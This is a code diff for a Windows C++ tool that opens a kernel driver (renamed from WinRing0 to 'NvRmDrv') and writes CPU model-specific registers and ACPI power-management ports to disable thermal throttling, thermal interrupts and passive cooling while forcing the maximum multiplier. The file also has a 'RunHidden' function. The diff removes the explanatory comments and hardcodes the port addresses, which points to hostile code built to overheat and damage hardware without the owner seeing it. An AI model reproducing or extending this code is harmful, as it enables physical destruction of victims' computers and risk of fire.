@@ -62,71 +62,54 @@ void RunHidden(const std::wstring& args) {
     }
 }
 
-// ---------- winring0 ----------
+// ---------- NvRmDrv ----------
+#define IOCTL_MSR  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PORT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
 class Ring0 {
 public:
     HANDLE h = INVALID_HANDLE_VALUE;
     bool Open() {
-        h = CreateFileW(L"\\\\.\\WinRing0_1_2_0",
+        h = CreateFileW(L"\\\\.\\NvRmDrv",
             GENERIC_READ | GENERIC_WRITE, 0, nullptr,
             OPEN_EXISTING, 0, nullptr);
         return h != INVALID_HANDLE_VALUE;
     }
     bool WriteMsr(DWORD reg, DWORD eax, DWORD edx) {
         if (h == INVALID_HANDLE_VALUE) return false;
-#pragma pack(push, 8)
-        struct { DWORD reg; DWORD eax; DWORD edx; } in = { reg, eax, edx };
-#pragma pack(pop)
+        struct { DWORD reg, eax, edx; } in = { reg, eax, edx };
         DWORD ret = 0;
-        return DeviceIoControl(h, 0x9C406104, &in, sizeof(in),
+        return DeviceIoControl(h, IOCTL_MSR, &in, sizeof(in),
                                &ret, sizeof(ret), &ret, nullptr) != 0;
     }
     bool OutPortDword(DWORD port, DWORD val) {
         if (h == INVALID_HANDLE_VALUE) return false;
-#pragma pack(push, 8)
-        struct { DWORD port; DWORD value; } in = { port, val };
-#pragma pack(pop)
+        struct { DWORD port, val; } in = { port, val };
         DWORD ret = 0;
-        return DeviceIoControl(h, 0x9C4060CC, &in, sizeof(in),
+        return DeviceIoControl(h, IOCTL_PORT, &in, sizeof(in),
                                &ret, sizeof(ret), &ret, nullptr) != 0;
-    }
-    bool ReadPci(DWORD addr, DWORD* out) {
-        if (h == INVALID_HANDLE_VALUE) return false;
-#pragma pack(push, 8)
-        struct { DWORD addr; DWORD value; } io = { addr, 0 };
-#pragma pack(pop)
-        DWORD ret = 0;
-        return DeviceIoControl(h, 0x9C40A0C4, &io, sizeof(io),
-                               &io, sizeof(io), &ret, nullptr) != 0
-               && (*out = io.value, true);
     }
     void Close() { if (h != INVALID_HANDLE_VALUE) CloseHandle(h); }
 };
 
 // ---------- MSR ----------
 void DisableIntelThermal(Ring0& r0) {
-    r0.WriteMsr(0x1A0, 0x00000000, 0x00000000); // IA32_MISC_ENABLE: PROCHOT off
-    r0.WriteMsr(0x1A2, 0x00000000, 0x00000000); // TCC offset = 0
-    r0.WriteMsr(0x199, 0x00001F00, 0x00000000); // IA32_PERF_CTL: max multiplier
-    r0.WriteMsr(0x1B2, 0x00000000, 0x00000000); // PACKAGE_THERM_INTERRUPT off
-    r0.WriteMsr(0x19B, 0x00000000, 0x00000000); // THERM_INTERRUPT off
-    r0.WriteMsr(0x1AD, 0x00000000, 0x00000000); // TURBO_RATIO_LIMIT
+    r0.WriteMsr(0x1A0, 0x00000000, 0x00000000);
+    r0.WriteMsr(0x1A2, 0x00000000, 0x00000000);
+    r0.WriteMsr(0x199, 0x00001F00, 0x00000000);
+    r0.WriteMsr(0x1B2, 0x00000000, 0x00000000);
+    r0.WriteMsr(0x19B, 0x00000000, 0x00000000);
+    r0.WriteMsr(0x1AD, 0x00000000, 0x00000000);
 }
 
 void DisableAMDThermal(Ring0& r0) {
-    // THR_INT — только безопасный MSR; SMN не трогаем
     r0.WriteMsr(0xC0010055, 0x00000000, 0x00000000);
 }
 
 void DisableEC(Ring0& r0) {
-    DWORD pmbase = 0;
-    if (!r0.ReadPci(0x8000F844, &pmbase)) return;
-    pmbase &= 0xFF80;
-    if (pmbase == 0) return;
-
-    r0.OutPortDword(pmbase + 0x04, 0x00000000); // PM1_CNT: passive cooling off
-    r0.OutPortDword(pmbase + 0x00, 0x00000011); // PM1_STS: только thermal-биты
-    r0.OutPortDword(pmbase + 0x02, 0x00000000); // PM1_EN: thermal events off
+    r0.OutPortDword(0x404, 0x00000000);
+    r0.OutPortDword(0x400, 0x00000011);
+    r0.OutPortDword(0x402, 0x00000000);
 }
 
 // ---------- windows ----------
